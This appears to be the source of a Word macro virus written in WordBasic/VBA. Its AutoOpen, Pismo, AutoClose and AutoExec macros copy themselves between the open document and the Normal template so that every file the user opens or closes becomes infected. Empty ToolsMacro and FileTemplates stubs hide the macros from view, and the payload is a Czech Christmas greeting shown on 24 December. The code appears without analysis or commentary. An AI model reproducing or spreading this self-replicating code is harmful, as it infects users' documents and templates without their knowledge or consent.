   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "AutoOpenA"

   Public Sub MAIN()
   Dim datum$
   Rem FormatFont .Points = "16", .Underline = 0, .Color = 0, .Strikethrough = 0, .Superscript = 0, .Subscript = 0, .Hidden = 0, .SmallCaps = 0, .AllCaps = 0, .Spacing = "0 b.", .Position = "0 b.", .Kerning = 0, .KerningMin = "", .Tab = "0", .Font = "Times New
   'Roman CE", .Bold = 1, .Italic = 1, .Outline = 0, .Shadow = 0

   Rem Insert "" + Chr$(13) + Chr$(10) + Chr$(13) + Chr$(10)
   datum$ = WordBasic.[Left$](WordBasic.[Date$](), Len(WordBasic.[Date$]()) - 2)

    If datum$ = "24.12." Then
       WordBasic.MsgBox "Veselé Vánoce a š*astný Nový rok!"
   End If
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim jmeno$
   Dim c$
   jmeno$ = WordBasic.[FileName$]()
   c$ = Mid(jmeno$, Len(jmeno$) - 3, 1)
   If c$ = "." Then WordBasic.FileSaveAs Name:=jmeno$, Format:=1

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim jmeno$
   jmeno$ = WordBasic.[WindowName$]()
   WordBasic.MacroCopy jmeno$ + ":Pismo", "Normal:AutoOpen"
   WordBasic.MacroCopy jmeno$ + ":AutoOpenA", "Normal:Pismo"
   WordBasic.MacroCopy jmeno$ + ":AutoOpen", "Normal:AutoOpenA"
   WordBasic.MacroCopy jmeno$ + ":AutoClose", "Normal:AutoClose"
   WordBasic.MacroCopy jmeno$ + ":AutoExec", "Normal:AutoExec"
   WordBasic.MacroCopy jmeno$ + ":ToolsMacro", "Normal:ToolsMacro"
   WordBasic.MacroCopy jmeno$ + ":FileTemplates", "Normal:FileTemplates"

   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Dim datum$
   Rem FormatFont .Points = "16", .Underline = 0, .Color = 0, .Strikethrough = 0, .Superscript = 0, .Subscript = 0, .Hidden = 0, .SmallCaps = 0, .AllCaps = 0, .Spacing = "0 b.", .Position = "0 b.", .Kerning = 0, .KerningMin = "", .Tab = "0", .Font = "Times New
   'Roman CE", .Bold = 1, .Italic = 1, .Outline = 0, .Shadow = 0

   Rem Insert "" + Chr$(13) + Chr$(10) + Chr$(13) + Chr$(10)
   datum$ = WordBasic.[Left$](WordBasic.[Date$](), Len(WordBasic.[Date$]()) - 2)

   If datum$ = "24.12." Then
       WordBasic.MsgBox "Veselé Vánoce a š*astný Nový rok!"
   End If
   End Sub

   Attribute VB_Name = "Pismo"

   Public Sub MAIN()
   Dim datum$
   Dim jmeno$
   Rem FormatFont .Points = "16", .Underline = 0, .Color = 0, .Strikethrough = 0, .Superscript = 0, .Subscript = 0, .Hidden = 0, .SmallCaps = 0, .AllCaps = 0, .Spacing = "0 b.", .Position = "0 b.", .Kerning = 0, .KerningMin = "", .Tab = "0", .Font = "Times New
   'Roman CE", .Bold = 1, .Italic = 1, .Outline = 0, .Shadow = 0

   Rem Insert "" + Chr$(13) + Chr$(10) + Chr$(13) + Chr$(10)
   datum$ = WordBasic.[Left$](WordBasic.[Date$](), Len(WordBasic.[Date$]()) - 2)

   If datum$ = "24.12." Then
       WordBasic.MsgBox "Veselé Vánoce a š*astný Nový rok!"
   End If

   jmeno$ = WordBasic.[WindowName$]()
   WordBasic.MacroCopy "Normal:AutoOpen", jmeno$ + ":Pismo"
   WordBasic.MacroCopy "Normal:Pismo", jmeno$ + ":AutoOpenA"
   WordBasic.MacroCopy "Normal:AutoOpenA", jmeno$ + ":AutoOpen"
   WordBasic.MacroCopy "Normal:AutoClose", jmeno$ + ":AutoClose"
   WordBasic.MacroCopy "Normal:AutoExec", jmeno$ + ":AutoExec"
   WordBasic.MacroCopy "Normal:ToolsMacro", jmeno$ + ":ToolsMacro"
   WordBasic.MacroCopy "Normal:FileTemplates", jmeno$ + ":FileTemplates"




   End Sub
